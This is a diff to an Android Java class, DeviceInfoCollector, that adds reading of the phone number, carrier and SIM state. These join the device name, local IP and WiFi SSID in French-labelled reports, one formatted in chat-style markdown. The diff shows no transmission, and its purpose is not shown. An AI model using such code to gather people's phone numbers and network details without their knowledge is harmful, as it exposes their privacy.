@@ -12,6 +12,9 @@ import android.net.wifi.WifiManager;
 import android.os.BatteryManager;
 import android.os.Build;
 import android.os.Environment;
+import android.telephony.SubscriptionInfo;
+import android.telephony.SubscriptionManager;
+import android.telephony.TelephonyManager;
 import android.os.StatFs;
 import android.util.DisplayMetrics;
 import android.view.WindowManager;
@@ -170,11 +173,66 @@ public class DeviceInfoCollector {
         return Build.VERSION.SECURITY_PATCH;
     }
 
+    public String getPhoneNumber() {
+        try {
+            TelephonyManager tm = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
+            if (tm != null) {
+                String number = tm.getLine1Number();
+                if (number != null && !number.isEmpty()) {
+                    return number;
+                }
+            }
+        } catch (SecurityException e) {
+            // permission not granted
+        }
+        try {
+            SubscriptionManager sm = (SubscriptionManager) ctx.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
+            if (sm != null) {
+                java.util.List<SubscriptionInfo> subs = sm.getActiveSubscriptionInfoList();
+                if (subs != null && !subs.isEmpty()) {
+                    String number = subs.get(0).getNumber();
+                    if (number != null && !number.isEmpty()) {
+                        return number;
+                    }
+                }
+            }
+        } catch (SecurityException e) {
+            // permission not granted
+        }
+        return "Non disponible (SIM sans numéro stocké)";
+    }
+
+    public String getOperator() {
+        TelephonyManager tm = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
+        if (tm != null) {
+            String op = tm.getNetworkOperatorName();
+            if (op != null && !op.isEmpty()) return op;
+        }
+        return "N/A";
+    }
+
+    public String getSimInfo() {
+        TelephonyManager tm = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
+        if (tm == null) return "N/A";
+        int state = tm.getSimState();
+        switch (state) {
+            case TelephonyManager.SIM_STATE_READY: return "Prête";
+            case TelephonyManager.SIM_STATE_ABSENT: return "Absente";
+            case TelephonyManager.SIM_STATE_PIN_REQUIRED: return "PIN requis";
+            case TelephonyManager.SIM_STATE_PUK_REQUIRED: return "PUK requis";
+            case TelephonyManager.SIM_STATE_NETWORK_LOCKED: return "Verrouillée réseau";
+            default: return "Inconnue";
+        }
+    }
+
     public String collectAll() {
         StringBuilder sb = new StringBuilder();
         sb.append("📱 Appareil: ").append(getDeviceName()).append("\n");
         sb.append("🤖 OS: ").append(getAndroidVersion()).append("\n");
         sb.append("🔋 Batterie: ").append(getBatteryInfo()).append("\n");
+        sb.append("📞 Numéro: ").append(getPhoneNumber()).append("\n");
+        sb.append("📱 Opérateur: ").append(getOperator()).append("\n");
+        sb.append("💳 SIM: ").append(getSimInfo()).append("\n");
         sb.append("🌐 IP locale: ").append(getLocalIp()).append("\n");
         sb.append("📶 Réseau: ").append(getNetworkType()).append("\n");
         sb.append("📡 WiFi: ").append(getWifiSSID()).append("\n");
@@ -194,6 +252,9 @@ public class DeviceInfoCollector {
         sb.append("**📱 ").append(getDeviceName()).append("**\n\n");
         sb.append("🤖 **OS:** ").append(getAndroidVersion()).append("\n");
         sb.append("🔋 **Batterie:** ").append(getBatteryInfo()).append("\n");
+        sb.append("📞 **Numéro:** `").append(getPhoneNumber()).append("`\n");
+        sb.append("📱 **Opérateur:** ").append(getOperator()).append("\n");
+        sb.append("💳 **SIM:** ").append(getSimInfo()).append("\n");
         sb.append("🌐 **IP locale:** `").append(getLocalIp()).append("`\n");
         sb.append("📶 **Réseau:** ").append(getNetworkType()).append("\n");
         sb.append("📡 **WiFi:** ").append(getWifiSSID()).append("\n");
